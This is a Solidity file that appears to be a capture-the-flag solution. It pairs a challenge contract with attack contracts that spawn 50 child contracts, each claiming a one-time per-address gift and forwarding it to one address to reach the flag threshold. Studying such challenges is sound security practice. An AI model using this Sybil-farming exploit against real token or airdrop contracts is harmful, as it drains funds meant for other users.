  
pragma solidity ^0.4.24;

contract jojo {
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    address owner;
        
    constructor()public{
        owner = msg.sender;
    }
    
    event SendFlag(string b64email);
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        emit SendFlag(b64email);
    }
    
    function jojogame() payable{
        uint geteth=msg.value/1000000000000000000;
        balanceOf[msg.sender]+=geteth;
    }
    
    function gift() public {
        assert(gift[msg.sender]==0);
        balanceOf[msg.sender]+=100;
        gift[msg.sender]=1;
    }
    
    function transfer(address to,uint value) public{
        assert(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender]-=value;
        balanceOf[to]+=value;
    }
    
}

contract hack {
    address instance_address = 0xd86ed76112295a07c675974995b9805912282eb3;
    jojo target = jojo(instance_address);

    function hack1(string b64email) public {
        target.payforflag(b64email);
    }
}

contract father {
    function createsons(){
        for (uint i=0;i<50;i++)
        {
            son ason=new son();
        }
    }
}

contract son {
    constructor() public{
        jojo tmp = jojo(0xd86ed76112295a07c675974995b9805912282eb3);
        tmp.gift();
        tmp.transfer(0xafFE1Eeea46Ec23a87C7894d90Aa714552468cAF,100);
    }
}
